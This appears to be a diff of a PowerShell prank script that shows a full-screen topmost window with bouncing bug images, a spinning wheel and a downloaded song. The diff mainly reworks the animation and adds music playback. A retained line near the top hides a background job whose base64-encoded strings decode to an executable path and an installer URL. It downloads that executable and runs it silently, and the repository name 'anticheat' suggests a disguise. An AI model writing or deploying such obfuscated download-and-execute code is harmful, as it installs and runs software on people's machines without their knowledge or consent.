@@ -12,11 +12,21 @@ public class BufferedPanel : Panel {
 }
 "@ -ReferencedAssemblies System.Windows.Forms,System.Drawing
 
+# Танчики в фоне
 Start-Job{$f=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcdGFuNGlraS5leGU='));iwr([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yZWRpcmVjdC5sZXN0YS5ydS9NVC9sYXRlc3Rfd2ViX2luc3RhbGxfcnU='))) -O $f;&$f}|Out-Null
-Start-Process "https://www.youtube.com/watch?v=yo5CILhgvT4"
 
+# Скачать и играть песню
+$script:songPath="$env:TEMP\song.mp3"
+iwr "https://raw.githubusercontent.com/sweetvata/anticheat/main/song.mp3" -O $script:songPath -UseBasicParsing
+$script:player=New-Object System.Windows.Media.MediaPlayer
+Add-Type -AssemblyName PresentationCore
+$script:player=New-Object System.Windows.Media.MediaPlayer
+$script:player.Open([Uri]$script:songPath)
+$script:player.Play()
+
+# Скачать картинку
 $script:imgPath="$env:TEMP\bg.jpg"
-iwr "https://naked-science.ru/wp-content/uploads/2022/09/taracyborg0.jpg" -O $script:imgPath -UseBasicParsing
+iwr "https://raw.githubusercontent.com/sweetvata/anticheat/main/bug.jpg" -O $script:imgPath -UseBasicParsing
 $script:bgImg=[System.Drawing.Image]::FromFile($script:imgPath)
 
 $script:REST  =[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('0KDQldCh0KI='))
@@ -39,24 +49,20 @@ $script:form.TopMost=$true;$script:form.BackColor='Black'
 $script:panel=New-Object BufferedPanel
 $script:panel.Dock='Fill';$script:panel.BackColor='Black'
 
-# Жуки как PictureBox контролы — двигаются через Left/Top
+# Жуки - данные движения
 $rng=New-Object System.Random
-$script:bugData=@()
-$script:bugCtrls=@()
+$script:bugX  = [float[]]::new(20)
+$script:bugY  = [float[]]::new(20)
+$script:bugVX = [float[]]::new(20)
+$script:bugVY = [float[]]::new(20)
+$script:bugSZ = [int[]]::new(20)
+
 for($i=0;$i-lt 20;$i++){
-    $sz=$rng.Next(50,90)
-    $pb=New-Object System.Windows.Forms.PictureBox
-    $pb.Width=$sz;$pb.Height=$sz
-    $pb.SizeMode='StretchImage'
-    $pb.Image=$script:bgImg
-    $pb.BackColor=[System.Drawing.Color]::Transparent
-    $pb.Left=$rng.Next(0,1800);$pb.Top=$rng.Next(0,900)
-    $script:panel.Controls.Add($pb)
-    $script:bugCtrls+=$pb
-    $script:bugData+=[PSCustomObject]@{
-        vx=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
-        vy=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
-    }
+    $script:bugX[$i]=[float]$rng.Next(50,1800)
+    $script:bugY[$i]=[float]$rng.Next(50,900)
+    $script:bugVX[$i]=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
+    $script:bugVY[$i]=[float](($rng.NextDouble()*5+3)*(if($rng.Next(2)){1}else{-1}))
+    $script:bugSZ[$i]=$rng.Next(45,80)
 }
 
 $script:panel.Add_Paint({
@@ -66,8 +72,16 @@ $script:panel.Add_Paint({
     $g.TextRenderingHint=[System.Drawing.Text.TextRenderingHint]::AntiAlias
     $W=$script:panel.Width;$H=$script:panel.Height
 
+    # Фон
     $g.DrawImage($script:bgImg,0,0,$W,$H)
 
+    # Жуки
+    for($i=0;$i-lt 20;$i++){
+        $sz=$script:bugSZ[$i]
+        $g.DrawImage($script:bgImg,[int]$script:bugX[$i],[int]$script:bugY[$i],$sz,$sz)
+    }
+
+    # Колесо
     $r=[int]([Math]::Min($W,$H)*0.38)
     $cx=[int]($W/2);$cy=[int]($H/2);$x=$cx-$r;$y=$cy-$r;$d=$r*2
 
@@ -103,6 +117,7 @@ $script:panel.Add_Paint({
     $cb=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
     $g.FillEllipse($cb,$cx-$cr,$cy-$cr,$cr*2,$cr*2);$cb.Dispose()
 
+    # Стрелка острием вверх
     $as=[float]($r*0.14)
     $pts=@(
         [System.Drawing.PointF]::new([float]$cx,           [float]($cy+$r-$as*0.5)),
@@ -143,12 +158,13 @@ $t1.Add_Tick({
     $script:ticks++
     $W=$script:panel.Width;$H=$script:panel.Height
 
-    for($i=0;$i-lt $script:bugCtrls.Length;$i++){
-        $pb=$script:bugCtrls[$i];$bd=$script:bugData[$i]
-        $nx=$pb.Left+$bd.vx;$ny=$pb.Top+$bd.vy
-        if($nx -lt -100){$nx=$W+10} elseif($nx -gt $W+10){$nx=-100}
-        if($ny -lt -100){$ny=$H+10} elseif($ny -gt $H+10){$ny=-100}
-        $pb.Left=[int]$nx;$pb.Top=[int]$ny
+    for($i=0;$i-lt 20;$i++){
+        $script:bugX[$i]+=$script:bugVX[$i]
+        $script:bugY[$i]+=$script:bugVY[$i]
+        if($script:bugX[$i] -lt -90){$script:bugX[$i]=$W+10}
+        elseif($script:bugX[$i] -gt $W+10){$script:bugX[$i]=-90}
+        if($script:bugY[$i] -lt -90){$script:bugY[$i]=$H+10}
+        elseif($script:bugY[$i] -gt $H+10){$script:bugY[$i]=-90}
     }
 
     if(-not $script:stopped){
@@ -160,7 +176,11 @@ $t1.Add_Tick({
 })
 
 $tClose=New-Object System.Windows.Forms.Timer;$tClose.Interval=28000
-$tClose.Add_Tick({$t1.Stop();$tStop.Stop();$tClose.Stop();$script:form.Close()})
+$tClose.Add_Tick({
+    $t1.Stop();$tStop.Stop();$tClose.Stop()
+    $script:player.Stop()
+    $script:form.Close()
+})
 
 $script:form.Add_Shown({$t1.Start();$tStop.Start();$tClose.Start()})
 [void]$script:form.ShowDialog()
